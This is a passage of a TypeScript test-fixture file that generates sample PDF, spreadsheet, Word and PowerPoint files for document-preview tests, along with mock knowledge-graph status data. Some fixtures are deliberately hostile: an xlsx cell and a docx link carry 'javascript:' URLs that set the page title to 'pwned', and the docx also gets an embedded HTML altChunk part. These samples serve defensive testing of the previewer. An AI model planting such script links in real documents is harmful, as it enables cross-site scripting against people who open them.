    fs.writeFileSync(doc, fs.readFileSync(doc, 'utf8').replace('</w:body>', '<w:altChunk r:id="rIdAlt1"/></w:body>').replace(/(<w:sectPr[\s\S]*?<\/w:sectPr>)(<w:altChunk r:id="rIdAlt1"\/>)/, '$2$1'))
    const rels = `${dir}/word/_rels/document.xml.rels`
    fs.writeFileSync(rels, fs.readFileSync(rels, 'utf8').replace('</Relationships>', '<Relationship Id="rIdAlt1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/></Relationships>'))
    const types = `${dir}/[Content_Types].xml`
    fs.writeFileSync(types, fs.readFileSync(types, 'utf8').replace('</Types>', '<Override PartName="/word/chunk.html" ContentType="text/html"/></Types>'))
    fs.rmSync(docx)
    return Bun.spawnSync(['zip', '-q', '-r', '-X', docx, '.'], { cwd: dir }).exitCode === 0
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
}

let office: [string, Uint8Array][] | null = null
/** PDF / xlsx / docx / pptx samples for the preview tests (docx and pptx need pandoc; skipped without it). */
function officeFixtures(): [string, Uint8Array][] {
  if (office) return office
  const out: [string, Uint8Array][] = [['docs/handbook.pdf', makePdf(['Company Handbook 2026', 'Section 1: Working hours are flexible.'])]]
  // PDFs pdf.js can only draw with its data files (web/src/lib/pdfjs-assets.ts): Korean text in a font the file does
  // not embed, a fax-style scan (CCITT) and a JPEG 2000 scan
  out.push(['docs/quote-form.pdf', makeCidPdf(['견적서 2026', '공급가액 합계 1,500,000원'])])
  out.push(['docs/scan-fax.pdf', makeImagePdf(CCITT_SCAN)])
  out.push(['docs/scan-jpeg2000.pdf', makeImagePdf(JPX_SCAN)])
  const wb = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['month', 'spend'], ['July', 1200], ['August', 900]]), 'Q3 spend')
  out.push(['docs/spend.xlsx', new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // the files an answer's "참고한 파일" points into (a page, a sheet range, a slide): long enough to scroll
  out.push(['docs/sources/report.pdf', makePagedPdf(Array.from({ length: 6 }, (_, i) => [`Sales report page ${i + 1}`, ...Array.from({ length: 30 }, (_, k) => `line ${k + 1} of page ${i + 1}`)]))])
  const budget = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(budget, XLSX.utils.aoa_to_sheet([['summary'], ['see 매출']]), '요약')
  XLSX.utils.book_append_sheet(budget, XLSX.utils.aoa_to_sheet([['month', 'channel', 'spend'], ...Array.from({ length: 80 }, (_, i) => [`m${i + 1}`, i % 2 ? 'naver' : 'instagram', 1000 + i])]), '매출')
  out.push(['docs/sources/budget.xlsx', new Uint8Array(XLSX.write(budget, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // a sheet whose cells link to javascript: and to a web page
  const links = XLSX.utils.aoa_to_sheet([['evil cell', 'web cell']])
  links.A1!.l = { Target: 'javascript:top.document.title="pwned-xlsx"' }
  links.B1!.l = { Target: 'https://example.com/sheet' }
  const wb2 = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb2, links, 'links')
  out.push(['docs/links.xlsx', new Uint8Array(XLSX.write(wb2, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  const docs = [
    ['brand.docx', 'docx', '# Brand guidelines\n\nPrimary color: mint.\n'],
    ['kickoff.pptx', 'pptx', '# Q4 kickoff\n\n- Launch in November\n'],
    ['sources/deck.pptx', 'pptx', Array.from({ length: 6 }, (_, i) => `## Deck slide ${i + 1}\n\n- point ${i + 1}\n`).join('\n')],
    ['links.docx', 'docx', '# Links\n\n[evil link](javascript:top.document.title="pwned-docx") and [web link](https://example.com/doc) and [app link](/admin/members)\n'],
  ] as const
  for (const [name, to, md] of docs) {
    try {
      const tmp = `${process.env.TMPDIR ?? '/tmp'}/mycel-mock-${process.pid}-${name.replace(/\//g, '-')}`
      const p = Bun.spawnSync(['pandoc', '-f', 'markdown', '-t', to, '-o', tmp], { stdin: enc.encode(md) })
      if (p.exitCode === 0 && (name !== 'links.docx' || withAltChunk(tmp))) {
        out.push([`docs/${name}`, new Uint8Array(fs.readFileSync(tmp))])
        fs.rmSync(tmp, { force: true })
      }
    } catch { /* no pandoc: no docx/pptx sample */ }
  }
  return (office = out)
}

/** Made-up folders for Admin › Team settings › Knowledge graph (no real team's). */
function mockKnowledgeGraph(available: boolean): KnowledgeGraphStatus {
  const documents = mockKgDocuments(true)
  if (!available) return { available: false, version: null, enabled: false, roots: [], personal: { folders: 0, files: 0, symbols: 0 }, added: [], diskBytes: 0, busy: 0, documents }
  const at = new Date(Date.now() - 4 * 60_000).toISOString()
  return {
    available: true, version: '1.5.0', enabled: true, added: [],
    roots: [
      { path: 'projects/web-app', source: 'auto', status: 'ready', files: 128, symbols: 1840, lastSyncAt: at },
      { path: 'projects/data-pipeline', source: 'auto', status: 'indexing', files: 0, symbols: 0, lastSyncAt: null },
      { path: 'shared', source: 'auto', status: 'ready', files: 1, symbols: 3, lastSyncAt: at },
    ],
    personal: { folders: 2, files: 14, symbols: 96 }, diskBytes: 23_400_000, busy: 0, documents,
  }
}

/** The documents part of the made-up knowledge graph: on (the default) with three folders and three files that could
 * not be read, or off (nothing indexed). */
function mockKgDocuments(on: boolean): KnowledgeGraphStatus['documents'] {
  if (!on) return { enabled: false, folders: [], personal: { folders: 0, documents: 0, failed: 0 }, documents: 0, failed: [], failedCount: 0, lastUpdatedAt: null, diskBytes: 0, busy: 0 }
  const at = new Date(Date.now() - 2 * 60_000).toISOString()
  return {
    enabled: true,
    folders: [
      { path: 'projects/marketing', source: 'auto', status: 'ready', documents: 84, failed: 2, lastUpdatedAt: at },
      { path: 'projects/web-app', source: 'auto', status: 'ready', documents: 12, failed: 0, lastUpdatedAt: at },
      { path: 'shared', source: 'auto', status: 'ready', documents: 40, failed: 1, lastUpdatedAt: at },
    ],
    personal: { folders: 2, documents: 31, failed: 1 },
    documents: 136,
    failed: [
      { path: 'projects/marketing/campaign-final.pptx', reason: 'too_big' },
      { path: 'projects/marketing/scan-2024.pdf', reason: 'empty' },
      { path: 'shared/old-contract.hwp', reason: 'unreadable' },
    ],
    failedCount: 3, lastUpdatedAt: at, diskBytes: 8_200_000, busy: 0,
  }
}
